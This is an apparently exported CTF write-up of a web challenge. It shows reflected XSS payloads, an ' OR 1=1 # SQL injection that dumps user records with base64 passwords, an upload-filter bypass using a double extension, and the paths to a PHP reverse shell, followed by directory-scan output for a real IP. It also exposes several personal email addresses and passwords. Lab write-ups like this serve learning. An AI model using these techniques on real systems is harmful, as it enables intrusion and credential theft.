@@ -1,0 +1,797 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Big Challenge from Cyber Community</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="b7dbf7fa-581b-4601-9f33-c500678069c1" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🔥</span></div><h1 class="page-title">Big Challenge from Cyber Community</h1></header><div class="page-body"><h1 id="27262ccb-ceea-494c-8777-cd279d333df3" class=""><mark class="highlight-teal">Web page:</mark></h1><h3 id="18b5ee4a-6387-4f06-928b-307051161701" class=""><mark class="highlight-red">Sign up:</mark></h3><p id="0110cec6-cfea-467a-beba-db4e24b73ff3" class=""><mark class="highlight-yellow">Normal user:
+</mark><a href="mailto:test@gmail.com">test@gmail.com</a>
+assassin
+pass123</p><p id="e2598be0-29a2-4830-bcc8-8d70ac182764" class=""><mark class="highlight-yellow">This vulnerable to XSS:</mark></p><pre id="ff1342bf-6c19-4483-bceb-63aeb9879377" class="code"><code>http://website/contact.php?complaint=&lt;h1&gt;hello&lt;/h1&gt;
+http://website/contact.php?complaint=&lt;/h5&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h5&gt;</code></pre><ul id="2369a0ec-fae1-4630-b29b-5447875fbc85" class="bulleted-list"><li>This cross site scripting vulnerability is reflected XSS</li></ul><h2 id="fd9de8eb-8916-49cd-95a5-0f922eae4cfe" class=""><mark class="highlight-red">Information disclosure:</mark></h2><p id="59c801a1-3474-4162-8a7b-b5ef09bc1a74" class=""><mark class="highlight-yellow">first step:</mark></p><p id="174f8442-2a03-4620-a30a-b81be49eda2b" class="">Exploit an SQL Injection in the sign up functionality </p><p id="383f408c-ee59-41df-bf39-157fa75fa6e2" class="">create a user with the username &#x27; OR 1=1 #</p><p id="0fbc53ec-a1a7-471d-992b-92041537136a" class="">try to login as &#x27;OR 1=1 #</p><figure id="0390aaf4-7ffc-4fae-b5e0-114438bafedb" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled.png"/></a></figure><p id="46358af7-a254-43e9-91d7-a9c4ad06927f" class=""><mark class="highlight-yellow">second step:</mark></p><p id="521e36a2-d8eb-46e5-867c-a916c237aeac" class="">go to contact and try to send  a message</p><figure id="eb28946b-d7b0-45bc-aedd-4b3323f741b0" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%201.png"><img style="width:1918px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%201.png"/></a></figure><p id="ecca9de0-fdaf-4363-957f-31d6ca673273" class="">
+</p><figure id="6f9c0f02-74f3-41a0-a6e7-b923f2d4e1ff" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%202.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%202.png"/></a></figure><p id="602031ff-3ccf-4477-b6f4-a203c04d650a" class="">From where i get this email admin@gmail.com ??</p><p id="4e539487-3f8f-40bf-b03e-1323e550b67a" class="">the query look like this:</p><pre id="19f5d893-e823-4930-8aa0-fdd9d435c6d3" class="code"><code># Original
+SELECT mail FROM  account WHERE username = &#x27;assassin&#x27;
+SELECT mail FROM  account WHERE username = &#x27; &#x27;OR 1=1 #</code></pre><p id="7366cbcd-929f-4e64-b1d5-5fc129e4aa24" class="">so after inspect the source code </p><figure id="55f404b9-2fd7-4ff5-b0f4-4186d3a38994" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%203.png"><img style="width:1917px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%203.png"/></a></figure><pre id="4db9eed5-1660-4b4f-b1f5-9bc975cb6976" class="code"><code>&lt;!-- [{&quot;ID&quot;:1,&quot;0&quot;:1,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,
+&quot;2&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,&quot;email&quot;:&quot;admin@gmail.com&quot;,&quot;3&quot;:&quot;admin@gmail.com&quot;},
+{&quot;ID&quot;:315,&quot;0&quot;:315,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;YWRtaW4=&quot;,&quot;2&quot;:&quot;YWRtaW4=&quot;,
+&quot;email&quot;:&quot;notadmin@gmail.com&quot;,&quot;3&quot;:&quot;notadmin@gmail.com&quot;},{&quot;ID&quot;:316,&quot;0&quot;:316,&quot;user&quot;:
+&quot;ss&quot;,&quot;1&quot;:&quot;ss&quot;,&quot;pass&quot;:&quot;ZGQ=&quot;,&quot;2&quot;:&quot;ZGQ=&quot;,&quot;email&quot;:&quot;ds@hotmail.com&quot;,&quot;3&quot;:&quot;ds@hotmail.com&quot;}
+,{&quot;ID&quot;:317,&quot;0&quot;:317,&quot;user&quot;:&quot;user&quot;,&quot;1&quot;:&quot;user&quot;,&quot;pass&quot;:&quot;cmVzdQ==&quot;,&quot;2&quot;:&quot;cmVzdQ==&quot;,&quot;email&quot;:
+&quot;email@hotmail.com&quot;,&quot;3&quot;:&quot;email@hotmail.com&quot;},{&quot;ID&quot;:318,&quot;0&quot;:318,&quot;user&quot;:&quot;assassin&quot;,&quot;1&quot;:
+&quot;assassin&quot;,&quot;pass&quot;:&quot;cGFzczEyMw==&quot;,&quot;2&quot;:&quot;cGFzczEyMw==&quot;,&quot;email&quot;:&quot;test@gmail.com&quot;,
+&quot;3&quot;:&quot;test@gmail.com&quot;},{&quot;ID&quot;:319,&quot;0&quot;:319,&quot;user&quot;:&quot;w&quot;,&quot;1&quot;:&quot;w&quot;,&quot;pass&quot;:&quot;d3c=&quot;,&quot;2&quot;:
+&quot;d3c=&quot;,&quot;email&quot;:&quot;wwe@hotmail.com&quot;,&quot;3&quot;:&quot;wwe@hotmail.com&quot;},{&quot;ID&quot;:322,&quot;0&quot;:322,
+&quot;user&quot;:&quot;iamnoob&quot;,&quot;1&quot;:&quot;iamnoob&quot;,&quot;pass&quot;:&quot;cXdlcnR5MTIz&quot;,&quot;2&quot;:&quot;cXdlcnR5MTIz&quot;,
+&quot;email&quot;:&quot;iamnoob_dontkillme@hotmail.com&quot;,&quot;3&quot;:&quot;iamnoob_dontkillme@hotmail.com&quot;},
+{&quot;ID&quot;:323,&quot;0&quot;:323,&quot;user&quot;:&quot;k&quot;,&quot;1&quot;:&quot;k&quot;,&quot;pass&quot;:&quot;Jw==&quot;,&quot;2&quot;:&quot;Jw==&quot;,&quot;email&quot;:&quot;bla@bla.com&quot;,
+&quot;3&quot;:&quot;bla@bla.com&quot;},{&quot;ID&quot;:324,&quot;0&quot;:324,&quot;user&quot;:&quot;mohamadABDALLAH&quot;,&quot;1&quot;:&quot;mohamadABDALLAH&quot;,
+&quot;pass&quot;:&quot;MTIzNDU2Nzg5&quot;,&quot;2&quot;:&quot;MTIzNDU2Nzg5&quot;,
+&quot;email&quot;:&quot;mohamad1031998@gmail.com&quot;,&quot;3&quot;:&quot;mohamad1031998@gmail.com&quot;},
+{&quot;ID&quot;:326,&quot;0&quot;:326,&quot;user&quot;:&quot;zkassir&quot;,&quot;1&quot;:&quot;zkassir&quot;,&quot;pass&quot;:&quot;emVpbmFiY3liZXIxMQ==&quot;,
+&quot;2&quot;:&quot;emVpbmFiY3liZXIxMQ==&quot;,&quot;email&quot;:&quot;zaynabkassir@gmail.com&quot;,&quot;3&quot;:&quot;zaynabkassir@gmail.com&quot;},
+{&quot;ID&quot;:327,&quot;0&quot;:327,&quot;user&quot;:&quot;karim&quot;,&quot;1&quot;:&quot;karim&quot;,&quot;pass&quot;:&quot;a2FyaW0=&quot;,&quot;2&quot;:&quot;a2FyaW0=&quot;,
+&quot;email&quot;:&quot;karim@karim.com&quot;,&quot;3&quot;:&quot;karim@karim.com&quot;},{&quot;ID&quot;:330,&quot;0&quot;:330,&quot;user&quot;:
+&quot;&#x27; OR 1=1 #&quot;,&quot;1&quot;:&quot;&#x27; OR 1=1 #&quot;,&quot;pass&quot;:&quot;dGVzdA==&quot;,&quot;2&quot;:&quot;dGVzdA==&quot;,&quot;email&quot;:&quot;test@gmail.com&quot;,
+&quot;3&quot;:&quot;test@gmail.com&quot;}] --&gt;</code></pre><p id="79447545-8df5-4e01-81ab-931599d3e0c3" class=""><mark class="highlight-yellow">step 1:</mark>
+Trying admin:admin and get this</p><figure id="4d92ef4e-fa93-48bd-b4fd-89f95a4fd336" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%204.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%204.png"/></a></figure><p id="f65692c8-25d7-4762-9fc5-d478c6d96104" class=""><mark class="highlight-yellow">step 2:</mark></p><p id="8dcb160f-fee1-4a34-a042-14bf5c858bb8" class="">source code of Contact and get this:</p><pre id="09967c98-7736-47d8-958e-236b95eb8e49" class="code"><code>&lt;!-- [{&quot;ID&quot;:1,&quot;0&quot;:1,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,
+&quot;2&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,&quot;email&quot;:&quot;admin@gmail.com&quot;,&quot;3&quot;:&quot;admin@gmail.com&quot;},
+{&quot;ID&quot;:315,&quot;0&quot;:315,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;YWRtaW4=&quot;,&quot;2&quot;:&quot;YWRtaW4=&quot;,
+&quot;email&quot;:&quot;notadmin@gmail.com&quot;,&quot;3&quot;:&quot;notadmin@gmail.com&quot;}] --&gt;</code></pre><pre id="428c2e84-bbdd-4e45-b518-a9cf53ed1a41" class="code"><code>[{&quot;ID&quot;:1,&quot;0&quot;:1,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,
+&quot;2&quot;:&quot;dGhlY2FrZWlzYWxpZQ==&quot;,&quot;email&quot;:&quot;admin@gmail.com&quot;,&quot;3&quot;:&quot;admin@gmail.com&quot;},
+{&quot;ID&quot;:315,&quot;0&quot;:315,&quot;user&quot;:&quot;admin&quot;,&quot;1&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;YWRtaW4=&quot;,&quot;2&quot;:&quot;YWRtaW4=&quot;,
+&quot;email&quot;:&quot;notadmin@gmail.com&quot;,&quot;3&quot;:&quot;notadmin@gmail.com&quot;}] </code></pre><p id="0b157ae8-b867-4b9a-8973-ba6a9eed04f9" class=""><mark class="highlight-pink">two admin:</mark></p><p id="cc0ec6ca-5abf-4db6-9863-38cb17b435cd" class="">First admin is fake admin with password <mark class="highlight-blue">(admin) (YWRtaW4=) base64</mark></p><p id="1a0355bd-eebe-41e4-88bd-1d6a49ca71b5" class="">Second admin with password:<mark class="highlight-blue"> (thecakeisalie) (dGhlY2FrZWlzYWxpZQ==) base64</mark><div class="indented"><ul id="c9fe9492-8a5f-4937-9bbf-960886a0a2ad" class="block-color-blue bulleted-list"><li>email: admin@gmail.com</li></ul><ul id="fd073b52-223f-48e7-b624-2ed9ae2ce17e" class="block-color-blue bulleted-list"><li>password: thecakeisalie</li></ul></div></p><p id="5969886e-4864-4d65-b3b2-9d20be75dfcf" class=""><mark class="highlight-yellow">step 3:</mark></p><p id="76c2dcb0-f550-4cf1-8771-3b62088418be" class="">Try to login as admin</p><p id="89d4c110-9997-4a9f-9582-03bede465b59" class="">Work fine</p><p id="85aba016-0415-4097-8736-90e76bf42c72" class="">Inspect source code get first flag:</p><figure id="dc842318-55f0-4fb0-acaf-3d3bb6168217" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%205.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%205.png"/></a></figure><pre id="3f34b70f-3268-4890-b0a0-3e0ed70f97eb" class="code"><code>&lt;!--CC{D0uble_SQL_Injection_Th1s_is_awsome}--&gt;</code></pre><h2 id="da232787-9630-4632-a942-b84ba85844ea" class=""><mark class="highlight-red">Image Collector:</mark></h2><p id="3258636e-b81a-4b80-8412-37fbbf0216a8" class="">After login as admin I get this page i am able to upload photo</p><figure id="32970f8b-61ef-4f42-9c13-37dd252f92c6" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%206.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%206.png"/></a></figure><blockquote id="554a5931-407a-4dcc-9edf-b3f3c6b51807" class="">Array ( [0] =&gt; extension not allowed, please choose a JPEG or PNG file. )</blockquote><p id="f4349ef7-4af1-4701-8df8-aca798d9b38e" class=""><mark class="highlight-yellow">step 1: burpsuite</mark></p><p id="8e13155c-2143-48d1-8e2f-a0772c55e8a7" class="">Get this message which mean there is a filter in extension let&#x27;s check that in burpsuite</p><p id="67622173-e7a2-43af-94f5-eb54c055bad3" class="">
+</p><figure id="ce5922b1-fac0-4ab6-b7b7-a1aaef56eb46" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%207.png"><img style="width:1917px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%207.png"/></a><figcaption>make filename =&quot;test.jpg&quot; and work fine and upload success</figcaption></figure><p id="d18ff234-3b08-4885-a968-6dda65147e79" class=""><mark class="highlight-yellow">step 2: explore</mark></p><p id="6d9416bb-70ba-4494-8560-8197d76aa936" class="">Okay now let&#x27;s test if i can upload PHP</p><p id="2b3eb3e5-9354-4e00-8561-28adf5379d73" class="">
+</p><figure id="458ff210-6ea4-48ad-9754-ba3793b53ff7" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%208.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%208.png"/></a><figcaption>direct php not allowed</figcaption></figure><p id="6971cb78-642c-46b6-96c0-7937b7fd47d2" class=""><mark class="highlight-yellow">step 3:  Bypass</mark></p><p id="7331e7b5-be29-4c31-af92-5c75cfa47ede" class="">Bypass work double extension <mark class="highlight-pink">test.png.php </mark></p><figure id="ec02e102-562f-4fb9-bf71-c4bdcd5bdbed" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%209.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%209.png"/></a></figure><p id="e25179ed-fddd-4cd6-beff-33b7b44e19df" class=""><mark class="highlight-yellow">step 4: get shell</mark></p><p id="b73a513e-e96d-4790-af66-e2e9a02769dd" class="">Check pentester monkey php reverse shell</p><pre id="ebd4d1fc-b2c8-4241-8ef3-e2255b4816e8" class="code"><code>/usr/share/webshells/php/php-reverse-shell.php
+/usr/share/webshells/php/php-backdoor.php</code></pre><pre id="6a189a1a-e250-4ce8-8814-65c1ce3a7c2a" class="code"><code>Time: Wed Apr  7 09:20:25 2021
+
+302    20B   http://178.62.44.186:80/admin.php    -&gt; REDIRECTS TO: index.php
+302    20B   http://178.62.44.186:80/contact.php    -&gt; REDIRECTS TO: index.php
+200     5KB  http://178.62.44.186:80/debug.log
+301   315B   http://178.62.44.186:80/images    -&gt; REDIRECTS TO: http://178.62.44.186/images/
+200     2KB  http://178.62.44.186:80/index.php
+200     2KB  http://178.62.44.186:80/index.php/login/
+302     0B   http://178.62.44.186:80/logout.php    -&gt; REDIRECTS TO: index.php
+200     3KB  http://178.62.44.186:80/register.php
